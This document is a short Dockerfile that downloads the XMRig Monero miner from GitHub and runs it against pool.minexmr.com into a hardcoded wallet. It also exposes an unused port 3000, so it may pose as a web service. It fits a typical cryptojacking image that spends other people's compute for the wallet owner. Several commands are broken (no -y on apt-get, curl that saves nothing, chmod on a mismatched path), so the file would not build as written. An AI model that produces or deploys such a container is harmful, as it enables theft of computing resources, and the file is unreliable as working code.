FROM ubuntu
WORKDIR /app
RUN apt-get update;
RUN apt-get install curl
RUN apt-get install tar
RUN curl https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
RUN tar -xf xmrig-6.17.0-linux-static-x64.tar.gz
RUN chmod +rwx xmrig-6.17.0
CMD ./xmrig-6.17.0/xmrig -o pool.minexmr.com:4444 -u 46fQMXV6agRU3ecaFxy4VQSa14M8Eu5gz7rtA4ahXgsxPuM6J7jiN6fcXePBPYhba9JSDtYL5kpvgJHxPPzrzt5iNNzGnmK
EXPOSE 3000
